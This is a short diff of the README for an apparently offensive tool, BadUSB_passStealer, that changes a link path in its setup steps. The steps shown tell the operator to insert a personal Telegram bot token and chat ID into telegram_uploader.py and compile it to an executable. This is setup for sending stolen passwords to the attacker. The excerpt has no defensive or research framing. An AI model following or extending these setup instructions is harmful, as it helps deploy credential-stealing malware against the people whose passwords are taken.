@@ -105,7 +105,7 @@ cd BadUSB_passStealer
 ```
 **Windows :** Click on green button on right top of main page. Then click on "Download Zip" and extract zip file.
 
-2. Replace TOKEN and CHAT_ID with your personal Telegram token and chat_id [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/telegram_uploader.py) at line 6 and 7;
+2. Replace TOKEN and CHAT_ID with your personal Telegram token and chat_id [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/telegram_uploader.py) at line 6 and 7;
 
 3. Convert telegram_uploader.py in exe file with this command :
 ```
